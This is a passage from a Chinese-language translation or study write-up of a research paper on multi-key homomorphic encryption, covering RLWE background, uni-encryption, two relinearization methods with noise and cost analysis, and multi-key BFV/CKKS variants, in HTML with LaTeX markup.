inline">\(&lt;\overline{ct_{1}}\otimes\overline{ct_{2}},\overline{sk}\otimes\overline{sk}&gt;=&lt;\overline{ct_{1}},\overline{sk}&gt;·&lt;\overline{ct_{2}},\overline{sk}&gt;\)</span>，因此它是在<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>下的有效加密。在重新线性化步骤中，我们的目标是将扩展密文<span class="math inline">\(\overline{ct}=\overline{ct_{1}}\otimes\overline{ct_{2}}∈R_{q}^{(k+1)^{2}}\)</span>转换为在<span class="math inline">\(\overline{sk}\)</span>下加密相同消息的规范密文。此步骤可以理解为一个密钥切换过程，需要对<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>进行特殊加密。我们注意到，<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>包含依赖于两个不同方的项<span class="math inline">\(s_{i}s_{j}\)</span>。因此，与传统HE方案不同的是，与非线性项对应的重新线性化密钥不能由一方生成。<br></p><p>  我们提出了一种基于RLWE的密码系统来实现这一功能。它看起来类似于GSW的环形变体，但我们的方案支持不同密钥下密文之间的一些操作。设<span class="math inline">\(g∈\mathbb{Z}_{d}\)</span>是积分向量，成为Gadget向量。该方案使用公共参考字符串模型CRS，各方共享一个随机多项式向量<span class="math inline">\(a∈R_{q}^{d}\)</span>。每一方自己生成一个特殊的对<span class="math inline">\(s_{i}\)</span>的加密，它是一个满足<span class="math inline">\(d_{i,0}+s_{i}·d_{i,1}≈r_{i}·g\ (mod\ q)\)</span>和<span class="math inline">\(d_{i,2}≈r_{i}·a+s_{i}·g\ (mod\ q)\)</span>的矩阵，其中<span class="math inline">\(r_{i}\)</span>是从密钥分布中采样的一个小多项式。它作为第i方的评估密钥被公布。<br></p><p>  我们提出了两种具有不同优点的再线性化方法。对于每一对<span class="math inline">\(1≤i,j≤k\)</span>，第一种方法将第i个评估密钥<span class="math inline">\(D_{i}\)</span>与第j个公钥<span class="math inline">\(b_{j}≈-s_{j}·a\ (mod\ q)\)</span>组合以生成<span class="math inline">\(K_{i,j}∈R_{q}^{d×3}，K_{i,j}·(1,s_{i},s_{j})≈s_{i}s_{j}·g\ (mod\ q)\)</span>。也就是说，<span class="math inline">\(K_{i,j}\)</span>可以用于将扩展密文的一项<span class="math inline">\(c_{i,j}\)</span>重新线性化为一个三元组<span class="math inline">\((c_{0}&#39;,c_{1}&#39;,c_{2}&#39;)，c_{0}&#39;+c_{i}&#39;s_{i}&#39;+c_{j}&#39;s_{j}&#39;≈c_{i,j}s_{i}s_{j}\ (mod\ q)\)</span>。这种方法可以视为先前GSW密文扩展的变体。特别的，<span class="math inline">\(K_{i,j}\)</span>的每一行由<span class="math inline">\(R_{q}\)</span>中的三个多项式组成，因此一个共享的重线性化密钥{<span class="math inline">\(K_{i,j}\)</span>}<span class="math inline">\(_{1≤i,j≤k}\)</span>的比特大小是<span class="math inline">\(O(dk^{2}·nlog\ q)\)</span>，密钥生成的复杂度是<span class="math inline">\(O(d^{2}k^{2})\)</span>多项式运算模q。重新线性化算法从<span class="math inline">\(s_{i,j}\)</span>到<span class="math inline">\((1,s_{i},s_{j})\)</span>重复<span class="math inline">\(O(k^{2})\)</span>密钥切换操作，因此它的复杂度是<span class="math inline">\(R_{q}\)</span>中的<span class="math inline">\(O(dk)^{2}\)</span>。我们注意到，<span class="math inline">\(K_{i,j}\)</span>可用于与第i方第j方相关的任何计算。<br></p><p>  我们的第二种方法通过递归方式将第j方的公钥<span class="math inline">\(b_{j}\)</span>与第i方的评估密钥<span class="math inline">\(D_{i}\)</span>相乘，直接将扩展密文的每一项线性化。第一个解决方案应该生成并存储一个共享的重新线性化密钥{<span class="math inline">\(K_{i,j}\)</span>}<span class="math inline">\(_{1≤i,j≤k}\)</span>，这使得它的空间和时间复杂度在k上二次增长。但是，第二种算法允许我们只保留在k上线性的个人评估密钥。此外，它还显著降低了重新线性化带来的附加噪声的方差，因此我们可以在保持相同功能的同时使用更小的参数。最后，我们将模数提升技术应用于第二种方法，以进一步降低噪声增长。<br></p><p>  作为一个正交问题，压缩MKHE方案的自举性在文献中还没有研究过。我们将现有的HE方案的自举方法推广到多密钥。推广的主要问题是，自举性的pipeline包含一些高级功能，如slot置换。我们通过将多密钥切换技术应用于Galois自同构，解决了这个问题并提供了所有必要的操作。<br></p><p>  最后，我们将最先进的优化技术应用于我们的MKHE方案，以实现对HE方案性能的改进。例如，我们实现了MKHE方案的剩余数系统（RNS）变体，并使用RNS友好的分解方法进行重新线性化，从而避免了昂贵的高精度算法。</p><h2 id="相关工作">1.3 相关工作</h2><p>  lópez-Alt 等人首先提出了一种基于NTRU的MKHE方案。之后Clear和McGoldrick提出了GSW的多密钥变体以及密文扩展技术来设计MKHE 方案，Mukherjee和Wichs对其进行了简化。Peikert和Shiehian在同一个多密钥GSW方案的基础上开发了两个multi-hop MKHE方案。但是，这些方案只能对大量的GSW扩展密文中的一个比特进行加密。<br></p><p>  Brakerski和Perlman提出了一种具有短密文（基于LWE）的MKHE方案，但其渐进/具体效率还没有得到明确的证明。Chen, Chillotti和Song在MKHE原语的首次实现中应用了TFHE框架，提出了一种改进方案。然而该方案不支持压缩技术，因此导致类似于TFHE的较大的膨胀率。<br></p><p>  最相关的研究是由Chen等人和li等人进行的。他们通过基于多密钥GSW方案生成重新线性化密钥来设计BGV的多密钥变体。但是，它由<span class="math inline">\(O(k^{2})\)</span>个密钥交换（从<span class="math inline">\(s_{i}s_{j}\)</span>切换到含有O(k)个分量的普通密钥）组成。此外，他们没有提供任何实施结果或关于具体性能的分析。我们的工作是这些研究的延伸，因为我们的重新线性化方法和其他优化技术也可以应用于BGV。我们还强调，通过观察评估键的稀疏性，可以提高以前MKHE方案的性能，但文章中并没有指明这一点。在表1中，我们提供了最近MKHE方案的表现；在我们的工作中用到了第二项进行比较。 <img src="http://tva1.sinaimg.cn/large/007aD2tWgy1gyb58pbp6rj30mj0a0jww.jpg" /></p><h1 id="背景">2. 背景</h1><h2 id="符号">2.1 符号</h2><p>  除非另有说明，否则所有对数均以2为底。用粗体表示向量，用大写粗体表示矩阵，用<span class="math inline">\(&lt;u,v&gt;\)</span>表示两个向量u、v的点积。对于实数r，<span class="math inline">\(⌊r⌉\)</span>表示距离r最近的整数，在中间时向上取整。我们用x←D来表示根据分布D的采样x。对于有限集S，U(S)表示S上的均匀分布。在本文中，我们令λ表示安全参数，所有已知的针对作用域下加密方案的有效攻击都应该采取<span class="math inline">\(Ω(2^{λ})\)</span>位操作。</p><h2 id="多密钥同态加密">2.2 多密钥同态加密</h2><p>  多密钥同态加密是一种密码系统，它允许我们评估可能使用不同密钥加密的密文上的算数电路。<br></p><p>  设M为具有算数结构的消息空间。一个MKHE方案由五个算法组成（Setup，KeyGen，Enc，Dec，Eval）。我们假设每个参与方都有一个对其公钥和私钥的引用（索引）。多密钥密文隐式包含一组有序的关联规则<span class="math inline">\(T=\{id_{1},...,id_{k}\}\)</span>，例如，一个新密文<span class="math inline">\(ct ← MKHE.Enc(μ; pk_{id})\)</span>对应一个元素集<span class="math inline">\(T = {id}\)</span>，随着各方密文计算的进行，参考集的大小会越来越大。</p><ul><li>Setup：<span class="math inline">\(pp ← MKHE.Setup(1^{λ}\)</span>).将安全参数λ作为输入，并返回公共参数pp。我们假设所有其他算法都隐式地将pp作为输入。</li><li>KeyGeneration：<span class="math inline">\((sk,pk) ← MKHE.KeyGen(pp)\)</span>. 输出一对公钥和私钥。</li><li>Encryption: <span class="math inline">\(ct ← MKHE.Enc(μ; pk_{id}\)</span>). 对明文μ∈M进行加密，输出密文<span class="math inline">\(ct ∈\{0,1\}*\)</span>。</li><li>Decryption：<span class="math inline">\(μ ← MKHE.Dec(\overline{ct};\{sk_{id}\}_{id∈T}\)</span>). 给定具有相应私钥序列的密文，输出明文。</li><li>Homomorphic evaluation：<span class="math inline">\(\overline{ct} ← MKHE.Eval(C,(\overline{ct_{1}},...,\overline{ct_{\iota}}),\{pk_{id}\}_{id∈T}\)</span>).给定电路C、多密钥密文元组以及相应的公钥集，输出密文。其引用集是输入密文的引用集的并集。</li></ul><p>  语义安全：对于任何两条消息<span class="math inline">\(μ_{0},μ_{1}∈M\)</span>，在i=0,1下，其分布<span class="math inline">\(\{MKHE.Enc(μ;pk_{id})\}\)</span>应该是不可区分的，其中<span class="math inline">\(pp←MKHE.Setup(1^(λ)),(sk,pk)←MKHE.KeyGen(pp)\)</span>。<br></p><p>  正确性与紧凑性：对于固定多项式<span class="math inline">\(poly(λ,k)\)</span>，如果与k方相关的密文大小是由poly(.,.)限定，则MKHE方案是紧凑的。<br></p><p>  对于<span class="math inline">\(1\le{j}\le{\iota}\)</span>，设<span class="math inline">\(\overline{ct}_{j}\)</span>为密文（引用集为<span class="math inline">\(T_{j}\)</span>），<span class="math inline">\(MKHE.Dec(\overline{ct}_{j},\{sk_{id}\}_{id\in{T}}),T=T_{1}\cup...\cup{T_{\iota}}\)</span>。则<span class="math inline">\(MKHE.Dec(\overline{ct}_{j},\{sk_{id}\}_{id\in{T}})=C(μ_{1},...,μ_{\iota})\)</span>  (1)<br></p><p>  (1)的等式可用近似等式替代，近似等式类似于支持近似算法的CKKS方案。</p><h2 id="环上的容错学习问题">2.3 环上的容错学习问题</h2><p>  在本文中，我们假设n是一个二次整数，<span class="math inline">\(R=\mathbb{Z}[x]/(X^{n}+1)\)</span>。记模整数q的R的剩余环为<span class="math inline">\(R_{q}=R/q·R)\)</span>。参数为(n,q,χ,ψ)的环上的容错学习问题：假设给定任意形式为<span class="math inline">\((a_{i},b_{i}=s·a_{i}+e_{i})∈R_{q}^{2}\)</span>的样本，其中<span class="math inline">\(a_{i}\)</span>在<span class="math inline">\(R_{q}\)</span>中是均匀随机的，从<span class="math inline">\(R_{q}\)</span>上的密钥分布χ中选择s，从R上的误差分布ψ中选择<span class="math inline">\(e_{i}\)</span>，<span class="math inline">\(b_{i}\)</span>在计算上与<span class="math inline">\(R_{q}\)</span>上的均匀随机元素是无法区分的。</p><h2 id="gadget分解">2.4 Gadget分解</h2><p>  设<span class="math inline">\(g=(g_{i}∈\mathbb{Z}^{d})\)</span>是一个Gadget向量，q为整数。Gadget分解用<span class="math inline">\(g^{-1}\)</span>表示，是一个从<span class="math inline">\(R_{q}\)</span>到<span class="math inline">\(R^{d}\)</span>的函数，它将元素<span class="math inline">\(a∈R_{q}\)</span>转换为小多项式<span class="math inline">\(u=(u_{0},...,u_{d-1})∈R^{d}\)</span>，满足<span class="math inline">\(a=\sum_{i=1}^{d-1}{g_{i}·u_{i}}(mod\ q)\)</span>。<br></p><p>  Gadget分解技术广泛应用于HE方案的构造中。非线性电路的同态评估基于密钥交换技术，大多数HE方案利用各种Gadget分解方法来控制噪声增长。相关文献中提出了各种分解方法，如位分解、基分解和基于RNS的分解。我们的实现利用了RNS-friendly分解来提高效率。</p><h1 id="重新线性化多密钥密文">3. 重新线性化多密钥密文</h1><p>  本节给出了对我们MKHE方案的高级描述，并解释了如何执行作为同态算数核心运算的重新线性化过程。</p><h2 id="具有压缩密文的he概述">3.1 具有压缩密文的HE概述</h2><p>  近年来，HE方案的表现取得了显著进步。例如，密文压缩技术允许我们在一个密文中加密多个数据，并以SIMD方式执行并行同态操作。目前，就每个明文时隙的摊销大小和时间而言，BGV、BFV和CKKS等批处理HE方案是性能最好的方案。他们采用一些类似DFT的算法将明文值向量转换为分圆环的元素。<br></p><p>  令<span class="math inline">\(sk=(1,s)\)</span>表示私钥<span class="math inline">\(s∈R\)</span>。基于RLWE的规范密文形式为<span class="math inline">\(ct=(c_{0},c_{1})∈R_{q}^{2}\)</span>，内积<span class="math inline">\(μ=&lt;ct,sk&gt;(mod\ q)\)</span>（相位）是明文m的随机编码。例如，BFV密文的相位以<span class="math inline">\(μ=(q/t)·m+e\)</span>的形式来表示模t明文，而CKKS的相位<span class="math inline">\(μ=m+e\)</span>是明文的近似值。<br></p><p>  对于同态计算，我们基本在给定密文的相位之间进行算术运算。特别的，RLWE密文的同态乘法包括两个步骤：张量积和重新线性化。对于输入密文<span class="math inline">\(ct_{1}\)</span>和<span class="math inline">\(ct_{2}\)</span>，我们首先计算它们的张量积并返回满足<span class="math inline">\(&lt;ct,sk\otimes{sk}&gt;=&lt;ct_{1},sk&gt;·&lt;ct_{2},sk&gt;\)</span>的扩展密文<span class="math inline">\(ct=ct_{1}\otimes{ct_{2}}\)</span>。由于<span class="math inline">\(sk\otimes{sk}\)</span>包含非线性项<span class="math inline">\(s^{2}\)</span>，它需要执行重新线性化过程，将扩展密文转换为加密相同消息的规范密文。粗略地说，我们发布了一个重新线性化密钥，它是在sk下对<span class="math inline">\(s^{2}\)</span>进行加密的某种密文，并为此转换执行了密钥交换算法。<br></p><p>  在多密钥情况下，与k个不同方相关的密文形式为<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})∈R_{q}^{k+1}\)</span>，它可以由级联密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>解密，其相位由<span class="math inline">\(μ=&lt;\overline{ct},\overline{sk}&gt;=c_{0}+\sum_{i=1}^{k}{c_{i}·s_{i}}\)</span>计算。如果我们遵循与单密钥设计中相同的同态操作流程，则张量积步骤将返回对应于<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>的扩展密文。因此，我们需要生成一个重新线性化密钥，该密钥由对<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>的项<span class="math inline">\(s_{i}s_{j}\)</span>加密的多个密文组成。与经典的HE方案不同，它需要一些额外的计算，因为<span class="math inline">\(s_{i}s_{j}\)</span>依赖于由不同方独立生成的两个密钥。接下来，我们将解释如何有效地为多密钥同态乘法生成重新线性化密钥。</p><h2 id="基本方案">3.2 基本方案</h2><p>  在本节中，我们将介绍一个基于环的方案，该方案用于生成一些重新线性化所需的公共参数。<br></p><ul><li><span class="math inline">\(Setup(1^{(\lambda)})\)</span>：对于给定的安全参数λ，设置RLWE维数n，密文模数q，密钥分布χ和在R上的错误分布ψ。生成一个随机向量<span class="math inline">\(\mathrm{a}←U(R_{q}^{d})\)</span>，返回公共参数<span class="math inline">\(pp=(n,q,χ,ψ,\mathrm{a})\)</span>.</li><li><span class="math inline">\(KeyGen(pp)\)</span>：采样私钥<span class="math inline">\(s←χ\)</span>。采样误差向量<span class="math inline">\(e←ψ^{d}\)</span>，并设置公钥为<span class="math inline">\(b=-s·\mathrm{a}+e(mod\ q) ∈ R_{q}^{d}\)</span></li><li><span class="math inline">\(UniEnc(µ;s)\)</span>：对于输入明文µ∈R，生成密文<span class="math inline">\(D=[d_{0}|d_{1}|d_{2}]∈R_{q}^{d×3}\)</span>如下：<br>   (1)采样<span class="math inline">\(r←χ\)</span><br>   (2)采样<span class="math inline">\(d_{1}←U(R_{q}^{d}),e_{1}←ψ^{d}\)</span>，设置<span class="math inline">\(d_{0}=-s·d_{1}+e_{1}+r·g\ (mod\ q)\)</span><br></li></ul><p>  (3)采样<span class="math inline">\(e_{2}←ψ^{d}\)</span>并设置<span class="math inline">\(d_{2}=r·a+e_{2}+µ·g\ (mod\ q)\)</span></p><p>  单加密（uni-encryption）算法是一种对称加密算法，可以加密单个环元素。一个单加密密文<span class="math inline">\(D=[d_{0}|d_{1}|d_{2}]←UniEnc(µ;s)\)</span>由<span class="math inline">\(R_{q}^{d}\)</span>中的三个向量组成，因此是<span class="math inline">\(R_{q}^{2d×2}\)</span>中普通RGSW密文的3/4倍。对于一个单加密密文D，前两列<span class="math inline">\([d_{0}|d_{1}]\)</span>可视为密钥s下r的加密，而<span class="math inline">\([d_{2}|−\mathrm{a}]\)</span>形成密钥r下µ的加密。<br></p><p>  安全性。单加密方案在参数(n,q, χ,ψ)的RLWE假设下是IND-CPA安全的。对任意u∈R，如下分布在计算上与<span class="math inline">\(R_{q}^{d}×R_{q}^{d}×R_{q}^{d×3}\)</span>上的均匀分布是不可区分的。<br></p><p><span class="math inline">\(\{(\mathrm{a},b,D):pp=(n,q,χ,ψ)←Setup(1^{(\lambda)}),(s,b)←KeyGen(pp),D←UniEnc(µ;s)\}\)</span></p><h2 id="重新线性化">3.3 重新线性化</h2><p>  我们重新讨论了扩展密文的重新线性化过程，并提出了两种具有不同优点的解决方案。在级联密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>下加密的两个多密钥密文<span class="math inline">\(\overline{ct}_{i}∈R_{q}^{k+1}\)</span>的张量积<span class="math inline">\(\overline{ct}=\overline{ct}_{1}\otimes\overline{ct}_{2}\)</span>可以被视为对应于张量平方密钥<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>的密文。注意，<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>包含一些与两个不同方相关的非线性项<span class="math inline">\(s_{i}s_{j}\)</span>。因此，计算服务器应该能，计算服务器应该能够通过非线性项<span class="math inline">\(s_{i}s_{j}\)</span>的线性化将扩展密文<span class="math inline">\(\overline{ct}_∈R_{q}^{(k+1)×(k+1)}\)</span>转换为规范密文。<br></p><p>  我们的重新线性化方法需要以下各方生成的相同公共材料（评估密钥）：</p><ul><li><span class="math inline">\(EvkGen(s)\)</span>：给定密钥s∈R，返回D ← UniEnc(s;s).</li></ul><p>  确切地说，每一方i都通过运行算法<span class="math inline">\((s_{i},b_{i})←KeyGen(pp)\)</span>和<span class="math inline">\(D_{i}←EvkGen(s_{i})\)</span>来生成自己的私钥、公钥和评估密钥，然后公布<span class="math inline">\((b_{i}, D_{i})\)</span>。在本节的其余部分中，我们将介绍两种重新线性化算法，并解释它们的优缺点。<br></p><p>  我们做了一个额外的循环安全性假设，因为评估密钥是由自身加密的密钥s的单加密。但是需要强调的是，我们的假设并不比要求密文自举或重新线性化的方案中的相同假设强。</p><h3 id="第一种方法">3.3.1 第一种方法</h3><p>  该解决方案包括一个预处理步骤，该步骤生成对应于所涉及的一组参与方的共享重新线性化密钥。共享重新线性化密钥由所有<span class="math inline">\(s_{i}·s_{j},1\leqslant{i,j}\leqslant{k}\)</span>加密组成。然后我们可以通过应用标准密钥交换技术来重新线性化扩展密文。<br></p><p>  此方法类似于先前工作中提出的方法，该方法还生成共享的评估密钥。但是，我们的共享重新线性化密钥的每个元素都是根据最多两方的公共信息计算的，因此由三个向量组成，而先前基于多密钥GSW方案的方法具有O(k)维数的项。</p><ul><li><p><span class="math inline">\(Convert(D_{i},b_{j})\)</span>：将（可能不同的）参与方i和j生成的一对单加密密文<span class="math inline">\(D_{i}=[d_{i,0}|d_{i,1}|d_{i,2}]∈R_{q}^{d×3}\)</span>和公钥<span class="math inline">\(b_{j}∈R_{q}^{d}\)</span>作为输入。设<span class="math inline">\(k_{i,j,0}\)</span>和<span class="math inline">\(k_{i,j,1}\)</span>是<span class="math inline">\(R_{q}^{d}\)</span>中的向量，使得<span class="math inline">\(k_{i,j,0}[\iota]=&lt;g^{-1}(b_{j}[\iota]),d_{i,0}&gt;,k_{i,j,1}[\iota]=&lt;g^{-1}(b_{j}[\iota]),d_{i,1}&gt;,1\leqslant{\iota}\leqslant{d}\)</span>，即，<span class="math inline">\([k_{i,j,0}|k_{i,j,1}]=M_{j}·[d_{i,0}|d_{i,1}]\)</span>，其中<span class="math inline">\(M_{j}∈R^{d×d}\)</span>是第<span class="math inline">\(\iota\)</span>行为<span class="math inline">\(g^{-1}(b_{j}[\iota])∈R^{d}\)</span>的矩阵。设<span class="math inline">\(k_{i,j,2}=d_{i,2}\)</span>，返回密文<span class="math inline">\(K_{i,j}=[k_{i,j,0}|k_{i,j,1}|k_{i,j,2}]∈R_{q}^{d×3}\)</span>。 <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeecubj7uj30o105stai.jpg" /></p></li><li><p><span class="math inline">\(Relin(\overline{ct};\{D_{i},b_{i}\}_{1\leqslant{i}\leqslant{k}})\)</span>：给定扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}\)</span>和k对评估/公共密钥<span class="math inline">\(\{(D_{i},b_{i})\}_{1\leqslant{i}\leqslant{k}}\)</span>，生成密文<span class="math inline">\(\overline{ct}&#39;∈R_{q}^{k+1}\)</span>如下：<br></p></li></ul><p> 1. 对<span class="math inline">\(1\leqslant{i,j}\leqslant{k}\)</span>，计算<span class="math inline">\(K_{i,j}←Convert(D_{i},b_{j})\)</span>，设置重新线性化密钥为<span class="math inline">\(\overline{rlk}=\{K_{i,j}\}_{1\leqslant{i,j}\leqslant{k}}\)</span><br></p><p> 2. 运行算法Algorithm1来重新线性化<span class="math inline">\(\overline{ct}\)</span> <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeeo7fhr6j30o10cmaf1.jpg" /></p><p>  我们注意到，第一步(<span class="math inline">\(\overline{rlk}\)</span>的生成)可以在公共信息<span class="math inline">\(\{D_{i},b_{i}\}_{1\leqslant{i}\leqslant{k}}\)</span>上预先计算，而无需将密文作为输入。<br></p><p>  正确性。我们首先声明，如果<span class="math inline">\(D_{i}\)</span>是由第i方加密的<span class="math inline">\(µ_{i}∈R\)</span>的单加密，<span class="math inline">\(b_{j}\)</span>是第j方的公钥，那么Convert算法的输出<span class="math inline">\(K_{i,j}←Convert(D_{i},b_{j})\)</span>是关于<span class="math inline">\((1,s_{i},s_{j})\)</span>的<span class="math inline">\(µ_{i}s_{j}\)</span>的加密，即<span class="math inline">\(k_{i,j,0}+s_{i}·k_{i,j,1}+s_{j}·k_{i,j,2}≈µ_{i}s_{j}·\mathrm{g}\ (mod\ q)\)</span>，由以下公式推导而来：<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyegp42f5ej30o102o76a.jpg" /></p><p>  请注意，<span class="math inline">\(M_{j},s_{j}\)</span>和<span class="math inline">\(r_{i}\)</span>都应该较小，以保持近似相等。我们在附录C中估算了噪声的大小。<br></p><p>  现在我们展示算法的正确性。因为第i方的评估密钥<span class="math inline">\(D_{i}\)</span>是<span class="math inline">\(µ_{i}=s_{i}\)</span>的单加密，我们得到<span class="math inline">\(K_{i,j}·(1,s_{i},s_{j})≈s_{i}s{j}·\mathrm{g}\ (mod\ q)\)</span>。从<span class="math inline">\(\overline{ct}&#39;\)</span>的定义，我们得到：<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyegsnbyswj30o109an09.jpg" /></p><h3 id="第二种方法">3.3.2 第二种方法</h3><p>  我们的第二个解决方案不会生成共享重新线性化密钥。相反，它通过递归的方式将扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}\)</span>的每一项<span class="math inline">\(c_{i,j}\)</span>乘以<span class="math inline">\(b_{j}\)</span>和<span class="math inline">\(D_{i}\)</span>来直接线性化。<br></p><ul><li><span class="math inline">\(Relin(\overline{ct};\{(D_{i},b_{i})\}_{1\leqslant{i}\leqslant{k}})\)</span>：对于给定的扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}\)</span>和k对评估/公共密钥，按照Algorithm 2中的描述生成密文<span class="math inline">\(\overline{ct}&#39;∈R_{q}^{k+1}\)</span></li></ul><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyegyd50iij30o10ex0zj.jpg" /></p><p>  在下一节中，我们将分析和比较两种重新线性化方法。简言之，第二种方法在存储和噪声增长方面具有优势，而如果重复使用共享评估密钥来重新线性化对应于同一组参与方的多个密文，则第一种方法可能更快。我们首先来证明第二种方法的正确性。<br></p><p>  正确性。在Algorithm 2的第二个for循环的每次迭代中，我们计算<span class="math inline">\(c_{i,j}&#39;=&lt;\mathrm{g}^{-1}(c_{i,j}),b_{j}&gt;\)</span>，然后分别将<span class="math inline">\(\mathrm{g}^{-1}(c_{i,j}&#39;)·[d_{i,0}|d_{i,1}]\)</span>和<span class="math inline">\(&lt;\mathrm{g}^{-1}(c_{i,j}),d_{i,2}&gt;\)</span>添加到<span class="math inline">\((c_{0}&#39;,c_{1}&#39;)\)</span>和<span class="math inline">\(c_{j}&#39;\)</span>。我们注意到：<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeh6mj92wj30fs01i0ta.jpg" /> <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeh6srx3oj30is02kmy8.jpg" /></p><p>  根据<span class="math inline">\(\overline{ct}&#39;\)</span>的定义，我们可以得到：<br> <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyeh7g9odlj30o10d3ady.jpg" /></p><h3 id="重新线性化算法的性能">3.3.3 重新线性化算法的性能</h3><p>  假设多密钥计算涉及k个不同的参与方。对于重新线性化扩展密文<span class="math inline">\(\overline{ct}=(c_{i,j})_{0\leqslant{i,j}\leqslant{k}}∈R_{q}^{(k+1)^{2}}\)</span>，我们的两种重新线性化方法都在每一个<span class="math inline">\(c_{i,j}\)</span>上重复一些计算，以将其相应的<span class="math inline">\(s_{i}·s_{j}\)</span>转换为<span class="math inline">\((1,s_{i},s_{j})\)</span>。因此，我们将关注每个解决方案的单个步骤(i,j)，以比较它们的性能。<br></p><p>  在第一种方法中，计算方生成共享重新线性化密钥<span class="math inline">\(K_{i,j}\)</span>，并使用它来线性化输入的扩展密文。<span class="math inline">\(K_{i,j}\)</span>的生成包括d×d和d×2矩阵之间的乘法，因此复杂性为<span class="math inline">\(2d^{2}\)</span>多项式乘法。而第二种方法没有任何预处理，Algorithm 2的一次迭代需要4d多项式乘法。因此，当使用预先计算的共享重新线性化密钥来对同一组（或其子集）参与方执行同态运算时，第一种方法的速度可以达到第二种的4/3倍。然而，与第二种方法的线性存储相比，第一种方法所需的存储空间在k上二次增长。<br></p><p>  第二种方法在噪声管理方面也有优势，我们将在下文与模数提升技术一起讨论。</p><h3 id="特殊模数技术">3.3.4 特殊模数技术</h3><p>  噪音增长是决定参数大小和密码系统整体性能的主要因素。总的来说，我们可以使用一个较大的分解度d来减少Gadget分解后向量<span class="math inline">\(\mathrm{g}^{-1}(·)\)</span>的大小以及密钥切换误差，但是这种方法会导致性能下降。此外，随着d的增加，噪声增长和计算复杂度之间的这种权衡的好处会越来越小。因此，当存在一个小噪音时，这一方法并不是最佳选择。特殊模数（又称模数提升）技术是一种很有吸引力的解决方案，可以用更小的开销来解决这一噪声问题。粗略地说，它将密文模数从q提高到pq，整数p称为特殊模数，然后计算<span class="math inline">\(R_{pq}\)</span>上的密钥切换过程，将模数还原回q。方法的主要优点是，由于模数的减少，密钥切换误差减少了约p个因子。我们将该技术应用到我们的重新线性化和加密算法中。特别地，重新线性化的一个特殊的模数变体需要两个连续的模数切换操作。（细节参见附录A）<br></p><p>  我们回顾一下，对于一个扩展密文<span class="math inline">\(\overline{ct}&#39;∈R_{q}^{k+1}\)</span>，使得对某个（为提高效率而尽量减少）的误差<span class="math inline">\(e_{lin}\)</span>，有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;=&lt;\overline{ct},\overline{sk}\otimes\overline{sk}&gt;+e_{lin}\)</span>。请读者参考附录C，其中提供了一个基于多项式系数方差的噪声分析，我们在本节中进行了一个简单总结。<br></p><p>  设u是<span class="math inline">\(R_{q}\)</span>上的一个一致随机变量。我们考虑它的Gadget分解<span class="math inline">\(\mathrm{g}^{-1}(u)\)</span>，并用<span class="math inline">\(V_{\mathrm{g}}\)</span>表示其系数的平均方差。我们分别从第一和第二种方法中估计出重新线性化误差的方差：<span class="math inline">\(V_{1}=k^{2}n^{2}\sigma^{2}·d^{2}V_{g}^{2},V_{2}≈k^{2}n^{2}\sigma^{2}·dV_{g}\)</span>。此外，第二种方法的特殊模数变体使得噪声的方差更小：<span class="math inline">\(V_{2}&#39;=p^{-2}·V_{2}+\frac{1}{24}{(k^{2}+k)n}\)</span>。<br></p><p>  与第一种方案相比，我们的第二种解决方案在实践中具有显著的优势，因为我们可以在得到相同噪音增长水平的同时，使用一个具有较小d的有效分解方法。此外，其模数增长的变体得到一个更小的误差方差，几乎不受分解的大小的影响，因为当我们引入一个特殊的模数p（它可以抵消<span class="math inline">\(V_{2}\)</span>）时，<span class="math inline">\(V_{2}&#39;\)</span>由第二项（舍入误差）所控制。</p><h1 id="两个压缩密文的mkhe方案">4. 两个压缩密文的MKHE方案</h1><p>  在本节中，我们提出了BFV和CKKS方案的多密钥变体。它们共享以下设置和密钥生成阶段，但有不同的消息编码和同态操作算法。<br></p><ul><li><span class="math inline">\(MKHE.Setup(1^{\lambda})\)</span>：运行<span class="math inline">\(Setup(1^{\lambda})\)</span>并返回参数pp<br></li><li><span class="math inline">\(MKHE.KeyGen(pp)\)</span>：每一方i根据<span class="math inline">\((s_{i},b_{i})←KeyGen(pp)\)</span>和<span class="math inline">\(D_{i}←EvkGen(s_{i})\)</span>分别生成私钥、公钥和评估密钥<br></li></ul><p>  我们MKHE方案的加密、解密和同态算法将在下一小节中介绍。在密文之间进行同态运算时，有一个共同的预处理。对于给定密文<span class="math inline">\(\overline{ct}_{i}∈R_{q}^{k_{i}+1}\)</span>，我们用<span class="math inline">\(k\ge{max\{k_{1},k_{2}\}}\)</span>表示<span class="math inline">\(\overline{ct}_{1}\)</span>和<span class="math inline">\(\overline{ct}_{2}\)</span>中参与方的数目。我们重新排列<span class="math inline">\(\overline{ct}_{i}\)</span>的元素，并在空条目中填充零，以生成某些共享相同密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>的密文<span class="math inline">\(\overline{ct}_{i}^{*}\)</span>。准确的说，对应于元组<span class="math inline">\((id_{1},...,id_{k})∈{\{1,2,...,k\}}^{k_{i}}\)</span>的密文<span class="math inline">\(\overline{ct}_{i}=(c_{0},c_{1},...,c_{k_{i}})\)</span>被转换为密文<span class="math 